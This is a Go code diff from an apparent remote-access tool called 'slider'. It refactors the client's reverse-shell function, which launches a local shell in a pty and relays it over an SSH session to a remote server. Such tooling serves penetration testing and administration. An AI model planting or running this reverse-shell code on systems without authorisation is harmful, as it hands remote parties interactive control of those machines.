@@ -10,13 +10,16 @@ import (
 	"slider/pkg/sconn"
 
 	"github.com/creack/pty"
+	"golang.org/x/crypto/ssh"
 )
 
 type Interpreter struct {
-	cmd  string
-	args []string
-	pty  string
-	size sconn.TermSize
+	shell     string
+	shellArgs []string
+	cmdArgs   []string
+	pty       string
+	size      sconn.TermSize
+	ptyF      *os.File
 }
 
 var nixShells = []string{
@@ -38,18 +41,22 @@ func findNixShell() string {
 	return ""
 }
 
-func setInterpreter() (*Interpreter, error) {
-	interpreter := &Interpreter{
-		pty: "pty",
+func (c *client) setInterpreter() error {
+	if c.interpreter.shell != "" {
+		return nil
 	}
+
 	system := runtime.GOOS
+
 	switch system {
 	case "darwin":
-		// Use "bash" cause "zsh" adds an extra "\n%" after return
-		interpreter.cmd = "/bin/bash"
-		//interpreter.pty = ""
+		// Use explicitly "bash" cause exists and "zsh" adds an extra "\n%" after return
+		c.interpreter.shell = "/bin/bash"
+		c.interpreter.pty = "pty"
 		// Make it interactive. Among other things will show prompt
-		interpreter.args = []string{"-i"}
+		c.interpreter.shellArgs = []string{"-i"}
+		c.interpreter.cmdArgs = []string{"-c"}
+
 	case "windows":
 		// TODO: Logic to decide running "cmd" or "powershell" (default to "cmd") inside a "Command" or a "ConPTY"
 		// https://pkg.go.dev/github.com/UserExistsError/conpty#section-readme
@@ -61,91 +68,88 @@ func setInterpreter() (*Interpreter, error) {
 			// Try default if not automatically detected
 			systemDrive = "C:"
 		}
-		interpreter.cmd = fmt.Sprintf("%s\\%s", systemDrive, winCmd)
-		interpreter.pty = ""
+		c.interpreter.shell = fmt.Sprintf("%s\\%s", systemDrive, winCmd)
+		c.interpreter.cmdArgs = []string{"/c"}
+
 	default:
+		// Handle any *Nix like OS
 		if shellEnv := os.Getenv("SHELL"); shellEnv != "" {
-			interpreter.cmd = shellEnv
+			c.interpreter.shell = shellEnv
 		} else {
-			interpreter.cmd = findNixShell()
+			c.interpreter.shell = findNixShell()
 		}
-		interpreter.args = []string{"-i"}
+		c.interpreter.shellArgs = []string{"-i"}
+		c.interpreter.cmdArgs = []string{"-c"}
+
 	}
 
-	if interpreter.cmd == "" {
-		return interpreter, fmt.Errorf("can not find cmd on system %s", system)
+	if c.interpreter.shell == "" {
+		return fmt.Errorf("can not find a suitable shell on system %s", system)
 	}
 
-	return interpreter, nil
+	return nil
 }
 
-func (c *client) ReverseShell() error {
-	interpreter, err := setInterpreter()
+func (c *client) reverseShell(sshSession *ssh.Session, initReq *ssh.Request) error {
+	err := c.setInterpreter()
 	if err != nil {
 		return err
 	}
 
-	stdin, stdinErr := c.sshSession.StdinPipe()
+	stdin, stdinErr := sshSession.StdinPipe()
 	if stdinErr != nil {
 		fmt.Printf("session.StdinPipe: %s", stdinErr)
 	}
 	defer func() {
 		_ = stdin.Close()
 	}()
-	stdout, stdoutErr := c.sshSession.StdoutPipe()
+	stdout, stdoutErr := sshSession.StdoutPipe()
 	if stdoutErr != nil {
 		fmt.Printf("session.StdoutPipe: %s", stdoutErr)
 	}
 
-	cmd := exec.Command(interpreter.cmd, interpreter.args...)
+	cmd := exec.Command(c.interpreter.shell, c.interpreter.shellArgs...) //nolint:gosec
 
-	switch interpreter.pty {
+	switch c.interpreter.pty {
 	// TODO: Add ConPty implementation (Windows > 2018)
 	case "conPty":
 	case "pty":
-		errSSHReq := c.answerSSHRequest("request-pty", true, nil)
+		errSSHReq := c.sendSessionRequest(sshSession, "request-pty", true, nil)
 		if errSSHReq != nil {
 			return fmt.Errorf("request-pty %s", errSSHReq)
 		}
-
-		errSSHReq = c.answerSSHRequest("reverse-shell", true, nil)
+		errSSHReq = c.sendSessionRequest(sshSession, "reverse-shell", true, nil)
 		if errSSHReq != nil {
 			return fmt.Errorf("reverse-shell %s", errSSHReq)
 		}
-
-		ptF, _ := pty.StartWithSize(cmd, &pty.Winsize{
-			Rows: uint16(c.interpreter.size.Rows),
-			Cols: uint16(c.interpreter.size.Cols),
+		_, payload, reqErr := c.sendConnRequest("window-size", true, nil)
+		if reqErr != nil {
+			return reqErr
+		}
+		var termSize sconn.TermSize
+		if unMarshalErr := json.Unmarshal(payload, &termSize); unMarshalErr != nil {
+			c.Fatalf("%s", unMarshalErr)
+		}
+		rows := termSize.Rows
+		cols := termSize.Cols
+		c.interpreter.ptyF, _ = pty.StartWithSize(cmd, &pty.Winsize{
+			Rows: uint16(rows),
+			Cols: uint16(cols),
 		})
-
-		// Receive Terminal size changes from the Server
-		go func() {
-			for r := range c.reqConnChannel {
-				if r.Type == "window-change" {
-					c.Debugf("Server Requested window change: %s\n", r.Payload)
-					var termSize sconn.TermSize
-					if err = json.Unmarshal(r.Payload, &termSize); err != nil {
-						c.Fatalf("%s", err)
-					}
-					if sizeErr := pty.Setsize(ptF, &pty.Winsize{
-						Rows: uint16(termSize.Rows),
-						Cols: uint16(termSize.Cols),
-					}); sizeErr != nil {
-						c.Errorf("%s", sizeErr)
-					}
-				}
-			}
-		}()
 
 		// Copy all SSH session output to the pty
 		go func() {
-			if _, outCopyErr := io.Copy(ptF, stdout); outCopyErr != nil {
+			if _, outCopyErr := io.Copy(c.interpreter.ptyF, stdout); outCopyErr != nil {
 				c.Debugf("Copy stdout: %s", outCopyErr)
 			}
 		}()
 
+		// Answer Server we are good to go
+
+		_ = c.replyConnRequest(initReq, true, []byte("shell-ready"))
+
 		// Copy pty output to SSH session stdin
-		if _, inCopyErr := io.Copy(stdin, ptF); inCopyErr != nil {
+		if _, inCopyErr := io.Copy(stdin, c.interpreter.ptyF); inCopyErr != nil {
 			c.Debugf("Copy stdin: %s", inCopyErr)
 		}
 	default:
@@ -167,19 +171,14 @@ func (c *client) ReverseShell() error {
 		for _, envVar := range environment {
 			cmd.Env = append(cmd.Environ(), envVar)
 		}
+
+		// Answer Server we are good to go
+		_ = c.replyConnRequest(initReq, true, []byte("shell-ready"))
+
 		if err = cmd.Run(); err != nil {
 			return err
 		}
 	}
 
-	return nil
-}
-
-func (c *client) answerSSHRequest(requestType string, ok bool, payload []byte) error {
-	ok, err := c.sshSession.SendRequest(requestType, ok, payload)
-	if err != nil {
-		return fmt.Errorf("%s %s", requestType, err)
-	}
-	c.Debugf("Sent Request \"%s\", received: \"%v\" from server.\n", requestType, ok)
 	return nil
 }
